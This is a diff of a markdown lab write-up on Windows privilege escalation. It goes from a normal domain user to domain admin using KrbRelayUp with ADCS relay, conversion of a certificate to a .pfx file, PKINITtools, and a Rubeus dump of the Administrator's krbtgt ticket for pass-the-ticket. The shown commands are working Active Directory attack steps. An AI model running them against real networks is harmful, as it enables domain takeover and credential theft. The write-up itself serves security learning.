@@ -7,13 +7,17 @@ A windows privesc from a simple user to full domain compromise using KrbRelayUp,
 The DC IP is 192.168.10.10 (DC1.lab.local)
 the client windows IP is 192.168.10.12 (Win11E.lab.local)
 
-I have working creds for john which is a normal user without any dangerous rights or privilege. He has a powershell session and adcs is configured on the dc so I can see if its vulnerable to KrbRelayUp or even basics ESC1-8 vulnerabilies.
-
+I have working creds for john who is a normal user without any dangerous rights or privilege. He has a powershell session and adcs is configured on the dc so I can see if its vulnerable to KrbRelayUp or even basics ESC1-8 vulnerabilies.
+```bash
 .\KrbRelayUp.exe relay -d lab.local -dc DC1.lab.local -m adcs
+```
 
 ![Using relay options of KrbRelayUp](KrbRelayUp.png)
 
+```bash
 echo "base64 certificate" | base64 -d > cert.pfx
+```
+
 
 Then using gettgtpkinit.py from the PKINITtools suite with the cert.pfx certificate
 
@@ -90,7 +94,7 @@ autorite nt\syst?me
 Maybe the domain admins logged on this current machine, lets see using Rubeus to dump tickets :
 
 ```bash
-.\Rubeus.exe dump /nowrap
+.\Rubeus.exe dump /nowrap /user:Administrateur /service:krbtgt
 ```
 
 The admins did logged in, I can now use the administrator cached ticket trough pass the ticket (ptt) !!! (we can already say that we are domains admins haha)
